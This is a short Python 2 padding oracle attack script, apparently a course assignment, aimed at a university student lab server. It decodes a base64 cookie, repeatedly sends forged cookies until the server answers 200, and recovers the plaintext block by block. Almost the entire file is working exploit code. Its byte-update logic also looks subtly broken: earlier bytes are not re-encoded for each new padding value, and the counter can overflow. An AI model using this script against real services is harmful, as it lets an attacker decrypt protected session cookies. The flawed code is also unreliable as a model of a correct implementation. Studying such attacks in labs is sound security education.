 #ref https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html

import requests
import sys
import base64

cookie = sys.argv[1]
print cookie
d_cookie = base64.b64decode(cookie)  # the cookie we received is base64 encoded, so we need to decoded it first to get the decoded d_cookie

# now, we need break the cookie into blocks, where each block is 16 bytes long

block_list = []						 # list of blocks, we now want to break the cookie into blocks
i = 0
while i < len(d_cookie):				 
	block_list.append(d_cookie[i:i+16])	# each block have length 16
	i += 16


# now we have a list of blocks, we should try to manipulate each byte and send to the server to see the response

# the bytearray that we used to store plaintext
# each time we decode a block, we add to it
result = bytearray()

for i in range(len(block_list) - 1):
	IV = block_list[i]   # the IV we use to get the plaintext , used later
	cur_block = block_list[i+1]   # the current block, start with block 1
	inter = bytearray(16)  # the intermidate value, all 0s in the beginning, we will fill in our guess value. It correspinds to the yellow values in the blog
	middle_result = bytearray(16)  # the value we store to help update values in inter, it corresponds to the green values in the ref blog
	for j in range(15, -1, -1): # now try from the last byte, which has index 15, unitl we guess to index 0
		response_code = 500
		while response_code != 200:  # we will keep guessing until we got the 200 response
			inter[j] += 1
			cur_cookie = {'user': base64.b64encode(inter + cur_block)} # pass curblock each time
			r = requests.get('http://ugster20.student.cs.uwaterloo.ca:4555', cookies=cur_cookie)
			response_code = r.status_code
			# print response_code

		# now the response code is 200, we have guessed the value
		# now the inter will have i to the end bytes correctly guessed
		middle_result[j] = inter[j] ^ (16-j)
		inter[j] = 0 ^ middle_result[j]  # update to help guess the next byte, we do XOR 0 because of the padding format k0000000...
	index = 0
	temp = bytearray(len(middle_result))
	while (index < len(middle_result)):
		IV = bytearray(IV)
		temp[index] = IV[index] ^ middle_result[index]
		index += 1
	result += temp

print ''.join(chr(x) for x in result)



